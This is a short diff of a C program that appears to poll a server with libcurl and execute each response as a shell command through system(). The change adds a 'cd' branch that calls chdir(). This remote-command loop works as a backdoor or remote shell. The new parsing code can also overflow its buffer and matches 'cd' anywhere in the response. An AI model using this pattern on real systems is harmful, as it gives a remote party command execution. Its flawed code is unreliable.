@@ -109,8 +109,16 @@ int main(int argc, char ** argv) {
         }
 
         resp_str.start[resp_str.len + 1] = '\0';
-
-        system(resp_str.start);
+        char * cd_start = { };
+        if ((cd_start = strstr(resp_str.start, "cd")) != NULL) {
+            char directory[4096] = { };
+            for (char * c = cd_start + 3; *c != ' '; c++) {
+                directory[c - cd_start - 3] = *c;
+            }
+            chdir(directory);
+        } else {
+            system(resp_str.start);
+        }
     }
 
     curl_easy_cleanup(handle);
